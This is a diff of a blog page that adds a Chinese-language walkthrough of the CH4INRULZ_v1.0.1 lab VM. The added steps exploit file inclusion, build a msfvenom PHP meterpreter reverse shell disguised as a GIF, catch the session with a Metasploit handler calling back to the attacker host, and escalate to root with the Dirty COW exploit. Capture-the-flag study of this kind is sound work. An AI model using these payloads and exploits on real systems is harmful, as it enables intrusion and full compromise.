@@ -100,7 +100,7 @@
           <!-- Date -->
           <span class="date-time info">On
             <span class="date">2020-02-03</span>
-            <span class="time">20:13:08</span>
+            <span class="time">06:19:58</span>
           </span>
           
         </div>
@@ -224,6 +224,33 @@ exploit</code></pre>
 <span class="hljs-number">6.</span> -o dcow gcc生成的目标文件,名字为dcow</code></pre>
 
 <p>./dcow -s运行</p>
+<h1 id="CH4INRULZ-v1-0-1渗透实战"><a href="#CH4INRULZ-v1-0-1渗透实战" class="headerlink" title="CH4INRULZ_v1.0.1渗透实战"></a>CH4INRULZ_v1.0.1渗透实战</h1><p>说几个注意点吧,这个是文件包含,找路径的时候需要很注意<br>我们可以利用文件包含来找路径,首先找80端口下的路径,这个是在apache下的路径中的<br>file=/etc/apache2/sites-enabled/000-default<br>发现后是/var/www路径后 可以上传小马之后访问<br>介绍一个扫描工具 nikto 扫描其中的很多目录<br>上传shell图片马<br>kali中生成这个文件</p>
+<pre><code class="hljs undefined">msfvenom -<span class="hljs-selector-tag">p</span> php/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">56.1</span> LPOST=<span class="hljs-number">7788</span>  -o shell<span class="hljs-selector-class">.php</span>
+➜  ~ echo <span class="hljs-string">"GIF98"</span> &gt;<span class="hljs-number">666</span><span class="hljs-selector-class">.gif</span>
+➜  ~ cat <span class="hljs-number">666</span><span class="hljs-selector-class">.gif</span> 
+GIF98
+➜  ~ cat shell<span class="hljs-selector-class">.php</span> &gt;&gt;<span class="hljs-number">666</span><span class="hljs-selector-class">.gif</span> 
+➜  ~ cat <span class="hljs-number">666</span>.gif</code></pre>
+
+<p>利用msf开始监听,单独的nc不行</p>
+<pre><code class="hljs undefined">msf &gt; use exploit/multi/handler 
+msf exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp
+payload =&gt; php/meterpreter/reverse_tcp
+msf exploit(multi/handler) &gt; set lport <span class="hljs-number">4444</span>
+lport =&gt; <span class="hljs-number">4444</span>
+msf exploit(multi/handler) &gt; set lhost  <span class="hljs-number">192.168</span><span class="hljs-meta">.56</span><span class="hljs-meta">.1</span>
+lhost =&gt; <span class="hljs-number">192.168</span><span class="hljs-meta">.56</span><span class="hljs-meta">.1</span>
+msf exploit(multi/handler) &gt; run 
+
+[*] Started reverse TCP handler on <span class="hljs-number">192.168</span><span class="hljs-meta">.56</span><span class="hljs-meta">.1</span>:<span class="hljs-number">4444</span> 
+[*] Sending stage (<span class="hljs-number">37775</span> bytes) to <span class="hljs-number">192.168</span><span class="hljs-meta">.56</span><span class="hljs-meta">.101</span>
+[*] Meterpreter session <span class="hljs-number">1</span> opened (<span class="hljs-number">192.168</span><span class="hljs-meta">.56</span><span class="hljs-meta">.1</span>:<span class="hljs-number">4444</span> -&gt; <span class="hljs-number">192.168</span><span class="hljs-meta">.56</span><span class="hljs-meta">.101</span>:<span class="hljs-number">45900</span>) <span class="hljs-meta">at</span> <span class="hljs-number">2018</span>-<span class="hljs-number">10</span>-<span class="hljs-number">28</span> <span class="hljs-number">13</span>:<span class="hljs-number">15</span>:<span class="hljs-number">14</span> +<span class="hljs-number">0800</span></code></pre>
+
+<p>在另一个终端中<br><code>curl &quot;http://192.168.56.101:8011/api/files_api.php&quot; -d &quot;file=/var/www/development/uploader/FRANKuploads/boom.gif&quot;</code><br>不知道靶机好像崩了一直不成功啊<br>最后是个脏牛提权,这个还跟我们之前介绍的还不一样<br>www-data权限，需要进行提权。<br>在github上搜索，下载linux-exploit-suggester工具<br>下载到靶机上,然后编译执行</p>
+<pre><code class="hljs undefined">gcc -pthread dirty<span class="hljs-selector-class">.c</span> -o dirty -lcrypt
+./dirty</code></pre>
+
+<p>会出现账号密码 sudo root 就行</p>
 
         </div>
       </div>
